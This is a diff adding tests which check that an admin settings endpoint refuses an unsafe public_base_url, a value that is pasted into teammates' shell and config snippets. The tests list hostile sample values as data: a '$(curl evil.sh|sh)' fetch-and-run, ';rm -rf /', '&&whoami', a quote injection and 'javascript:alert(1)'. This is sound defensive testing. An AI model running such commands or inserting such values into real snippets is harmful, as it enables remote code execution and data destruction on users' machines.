@@ -466,3 +466,61 @@ describe("/admin/settings — agent SSO (token exchange) guard", () => {
     expect(viaAutoProvisionOff.status).toBe(200);
   });
 });
+
+/**
+ * public_base_url is spliced into the copy-paste snippets the Connecting-agents
+ * panel renders — a `bash` block for Claude Code and Codex, and quoted strings
+ * in config.toml / config.yaml / mcp.json for Codex, Hermes, Gemini CLI and
+ * Cursor. Those are pasted verbatim into a teammate's terminal and config
+ * files, so a value carrying shell metacharacters or a quote turns "can edit
+ * server settings" into code execution on everyone else's machine. It was
+ * stored with only a trim and a trailing-slash strip.
+ */
+describe("/admin/settings — public_base_url", () => {
+  it("accepts a well-formed http(s) URL and strips the trailing slash", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    const ok = await jsonRequest(
+      app, "PATCH", "/admin/settings", { public_base_url: "https://nest.example.com/" }, admin.apiKey,
+    );
+    expect(ok.status).toBe(200);
+    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
+    expect(after.data.public_base_url).toBe("https://nest.example.com");
+  });
+
+  it("refuses a value that is not a http(s) URL", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    for (const v of ["not-a-url", "ftp://nest.example.com", "javascript:alert(1)"]) {
+      const bad = await jsonRequest(
+        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
+      );
+      expect(bad.status, `expected ${v} to be refused`).toBe(400);
+      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
+    }
+  });
+
+  it("refuses shell metacharacters and quotes, and writes nothing", async () => {
+    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
+    const admin = await registerUser(app, OWNER_EMAIL);
+    await jsonRequest(
+      app, "PATCH", "/admin/settings", { public_base_url: "https://good.example.com" }, admin.apiKey,
+    );
+    const hostile = [
+      "https://x.example/a$(curl evil.sh|sh)",
+      "https://x.example/a;rm -rf /",
+      'https://x.example/a","evil":"1',
+      "https://x.example/a&&whoami",
+    ];
+    for (const v of hostile) {
+      const bad = await jsonRequest(
+        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
+      );
+      expect(bad.status, `expected ${v} to be refused`).toBe(400);
+      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
+    }
+    // Refused before anything is written — the earlier good value survives.
+    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
+    expect(after.data.public_base_url).toBe("https://good.example.com");
+  });
+});
